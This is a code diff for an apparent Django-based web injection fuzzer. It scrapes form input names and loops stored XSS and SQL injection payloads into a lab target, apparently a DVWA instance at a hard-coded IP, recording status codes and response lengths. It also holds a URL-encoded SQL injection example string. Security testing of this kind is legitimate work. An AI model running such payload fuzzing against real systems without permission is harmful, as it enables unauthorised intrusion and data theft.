@@ -21,6 +21,7 @@ content_length = []
 payload = []
 result = []
 
+example_string = "http://47.254.202.210/vulnerabilities/sqli/?id=%20OR%203409%3d3409%20AND%20(%27pytW%27%20LIKE%20%27pytW&Submit=Submit"
 URL = "http://47.254.202.210/login.php"
 
 def createSession(url):
@@ -32,6 +33,44 @@ def createSession(url):
     s.post(url, data=payload)
     return s
 
+def findInput(url):
+    s = createSession(URL)
+    content = s.get(url).content
+    soup = bs(content, "html.parser")
+    input_form = soup.find_all("input")
+    return [i.get("name") for i in input_form if i.get("name") is not None]
+
+context_data = {}
+def postMethodValidation(url, type_attack):
+    input_id = findInput(url)
+    global context_data
+    context_data = {
+        "url": url,
+        "input_id": input_id,
+        "type_attack" : type_attack
+    }
+    # print(context_data)
+
+
+def postMethodView(request):
+    global result
+    input_id = context_data["input_id"]
+    payload = {}
+    if request.method == 'POST':
+        for key, value in request.POST.items():
+            payload[key] = value
+        for key, val in payload.items():
+            for p in xss.objects.all()[:5]:
+                pay = p.payload
+                payload[key] = re.sub("\$[a-zA-Z0-9]*\$", pay, val)
+                s = createSession(URL)
+                response = s.post(context_data['url'], data=payload[key])
+                status_code = response.status_code
+                content_length = len(response.text)
+                result.append([payload[key], status_code, content_length])
+        return HRR("../result/") 
+    return render(request, "tools/post_method.html", context_data)
+
 def index(request):
     global response_code
     global content_length
@@ -42,28 +81,39 @@ def index(request):
         if (form_field.is_valid()):
             url = form_field.cleaned_data["url_field"]
             type_attack = form_field.cleaned_data['type_attack']
+            attack_method = form_field.cleaned_data['attack_method']
+            if (attack_method == "POST"):
+                postMethodValidation(url, type_attack)
+                return HRR('method/post')
             if(type_attack == 'xss'):
                 # print(xss.objects.values_list("payload"))
                 # payload = xss.objects.values("payload").get(id=1)['payload']
-                for p in xss.objects.all():
-                    payload = p.payload
-                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
-                    response = requests.post(quote(submit))
-                    status_code = requests.post(submit).status_code
-                    content_length = len(response.content)
-                    result.append([payload, status_code, content_length])
-                # payload = xss.objects.all()
-                # print(submit)
-                # payload = xss.objects.all()
-            elif(type_attack == "sqli"):
-                for i, p in enumerate(sqlinjection.objects.all()[:10]):
+                for p in (xss.objects.all()[:5]):
                     payload = p.payload
                     submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
                     submit = requote_uri(submit)
                     session = createSession(URL)
                     response = session.post(submit)
                     status_code = response.status_code
+                    content_length = len(response.content)
+                    result.append([payload, status_code, content_length])
+                # payload = xss.objects.all()
+                # print(submit)
+                # payload = xss.objects.all()
+            elif(type_attack == "sqli"):
+                for i, p in enumerate(sqlinjection.objects.all()[:30]):
+                    payload = p.payload
+                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
+                    submit = requote_uri(submit)
+                    # if (i == 12):
+                    #     print("index 12's payload:", submit)
+                    session = createSession(URL)
+                    # session = requests.Session()
+                    response = session.post(submit)
+                    status_code = response.status_code
                     content_length = len(response.text)
+                    if (content_length != 4479):
+                        print(response.text)
                     result.append([payload, status_code, content_length])
                 # payload = sqlinjection.objects.all()
             elif(type_attack == "nosql"):
